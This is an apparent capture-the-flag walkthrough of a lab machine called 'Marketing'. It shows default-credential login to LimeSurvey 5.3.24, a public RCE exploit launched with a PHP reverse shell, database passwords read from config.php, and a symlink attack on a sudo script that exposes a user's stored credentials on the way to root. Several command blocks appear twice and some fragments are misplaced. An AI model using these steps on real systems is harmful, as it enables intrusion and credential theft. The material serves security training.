The website returns the following page:

Checking the website shows the hostname is marketing.pg:

There is a button which we can press to fill in a survey:

Clicking the button redirects me to customers-survey.marketing.pg. Add this hostname inside /etc/hosts file.

Accessing the survey webpage contains the following:

However, there are no surveys as shown in the image above.

Doing a basic directory search returns the following:

┌──(kali㉿kali)-[~/Desktop/Labs/Marketing]

As shown in the output above, the admin interface is also identified.

Apparently the default credentials are admin:password:

Browse over to the /admin page and login using the default credentials to gain access to the LimeSurvey application:

As shown in the output above, the application version is 5.3.24.

Clone this GitHub Repository Project which contains the exploit. Make changes to the php-rev.php file and insert our own IP and port for the listener. Then create a ZIP out of the two files. Also modify the code at line 64 to point to the correct ZIP file. Start the listener and run the exploit:

┌──(kali㉿kali)-[~/Desktop/Labs/Marketing/Limesurvey-RCE]
└─$ python3 exploit.py http://customers-survey.marketing.pg/ admin password 80
_______________LimeSurvey RCE_______________


Usage: python exploit.py URL username password port
Example: python exploit.py http://192.26.26.128 admin password 80

Now we have a shell on the machine as the user www-data:

The password EzPwz2022_dev1$$23!! is located inside config.php file of the LimeSurvey application:

$ cd config
$ ls -la
total 188
drwxr-xr-x  2 www-data www-data  4096 Jul 13  2022 .
drwxr-xr-x 17 www-data www-data  4096 Jul 13  2022 ..

$ 
$ cat config.php
<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|    'connectionString' Hostname, database, port and database type for 
|     the connection. Driver example: mysql. Currently supported:
|                 mysql, pgsql, mssql, sqlite, oci
|    'username' The username used to connect to the database
|    'password' The password used to connect to the database
|    'tablePrefix' You can add an optional prefix, which will be added
|                 to the table name when using the Active Record class
|
*/
return array(
    'components' => array(
        'db' => array(
            'connectionString' => 'mysql:host=localhost;port=3306;dbname=limesurvey;',
            'emulatePrepare' => true,
            'username' => 'limesurvey_user',
            'password' => 'EzPwz2022_dev1$$23!!',
            'charset' => 'utf8mb4',
            'tablePrefix' => 'lime_',
        ),
        
         'session' => array (
            'sessionName'=>'LS-EYFVWDSAKOIAECZM',
            // Uncomment the following lines if you need table-based sessions.
            // Note: Table-based sessions are currently not supported on MSSQL server.
            // 'class' => 'application.core.web.DbHttpSession',
            // 'connectionID' => 'db',
            // 'sessionTableName' => '{{sessions}}',
         ),
        
        'urlManager' => array(
            'urlFormat' => 'path',
            'rules' => array(
                // You can add your own rules here
            ),
            'showScriptName' => true,
        ),
    
    ),
    // For security issue : it's better to set runtimePath out of web access
    // Directory must be readable and writable by the webuser
    // 'runtimePath'=>'/var/limesurvey/runtime/'
    // Use the following config variable to set modified optional settings copied from config-defaults.php
    'config'=>array(
    // debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
    // then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
    // on your webspace.
    // LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
        'debug'=>0,
        'debugsql'=>0, // Set this to 1 to enanble sql logging, only active when debug = 2
        // Mysql database engine (INNODB|MYISAM):
         'mysqlEngine' => 'MYISAM'

,		// Update default LimeSurvey config here
    )
);
/* End of file config.php */

|                 to the table name when using the Active Record class

,		// Update default LimeSurvey config here

);

This user can run sync.sh as m.sander user:

t.miller@marketing:~$ sudo -l
[sudo] password for t.miller: 
Matching Defaults entries for t.miller on marketing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User t.miller may run the following commands on marketing:
    (m.sander) /usr/bin/sync.sh
t.miller@marketing:~$ sudo -l
[sudo] password for t.miller: 
Matching Defaults entries for t.miller on marketing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User t.miller may run the following commands on marketing:
    (m.sander) /usr/bin/sync.sh

When checking the script content, I get the following:

t.miller@marketing:/home/m.sander$ cat /usr/bin/sync.sh
#! /bin/bash

if [ -z $1 ]; then
    echo "error: note missing"
    exit
fi

note=$1

if [[ "$note" =~ .*m.sander.* ]]; then
    echo "error: forbidden"
    exit
fi

difference=$(diff /home/m.sander/personal/notes.txt $note)

if [[ -z $difference ]]; then
    echo "no update"
    exit
fi

echo "Difference: $difference"

cp $note /home/m.sander/personal/notes.txt

echo "[+] Updated."
t.miller@marketing:/home/m.sander$ cat /usr/bin/sync.sh
#! /bin/bash

if [ -z $1 ]; then
    echo "error: note missing"
    exit
fi

note=$1

if [[ "$note" =~ .*m.sander.* ]]; then
    echo "error: forbidden"
    exit
fi

difference=$(diff /home/m.sander/personal/notes.txt $note)

if [[ -z $difference ]]; then
    echo "no update"
    exit
fi

echo "Difference: $difference"

cp $note /home/m.sander/personal/notes.txt

echo "[+] Updated."

According to ChatGPT, the code is vulnerable to Symlink attack:

Also, our user belongs to the mlocate group which allows us to read the database of indexed files located at /var/lib/mlocate/mlocate.db. Using this technique, I identified an interesting file called creds-for-2022.txt:

┌──(kali㉿kali)-[~/Desktop/Labs/Marketing]
└─$ cat output.txt | grep -A 3 "personal"
personal
/home/m.sander/personal
creds-for-2022.txt
notes.txt
/home/t.miller
--
┌──(kali㉿kali)-[~/Desktop/Labs/Marketing]
└─$ cat output.txt | grep -A 3 "personal"
personal
/home/m.sander/personal
creds-for-2022.txt
notes.txt
/home/t.miller
--

Obtain the credentials of the user m.sander inside /personal directory via Symlink attack:

t.miller@marketing:~$ ln -s /home/m.sander/personal/creds-for-2022.txt test.txt
t.miller@marketing:~$ sudo -u m.sander /usr/bin/sync.sh "test.txt"
Difference: 0a1,8
> slack account:
> michael_sander@gmail.com - pa$$word@123$$4!!
> 
> github:
> michael_sander@gmail.com - EzPwz2022_dev1$$23!!
> 
> gmail:
> michael_sander@gmail.com - EzPwz2022_12345678#!
\ No newline at end of file
[+] Updated.
t.miller@marketing:~$ ln -s /home/m.sander/personal/creds-for-2022.txt test.txt
t.miller@marketing:~$ sudo -u m.sander /usr/bin/sync.sh "test.txt"
Difference: 0a1,8
> slack account:
> michael_sander@gmail.com - pa$$word@123$$4!!
> 
> github:
> michael_sander@gmail.com - EzPwz2022_dev1$$23!!
> 
> gmail:
> michael_sander@gmail.com - EzPwz2022_12345678#!
\ No newline at end of file
[+] Updated.

Using the gmail account password, we can successfully switch to this user. As shown below, this user can run all commands with root privileges:

t.miller@marketing:~$ su m.sander
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

m.sander@marketing:/home/t.miller$ 

t.miller@marketing:~$ su m.sander
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

m.sander@marketing:/home/t.miller$

m.sander@marketing:/home/t.miller$ sudo -l
[sudo] password for m.sander:
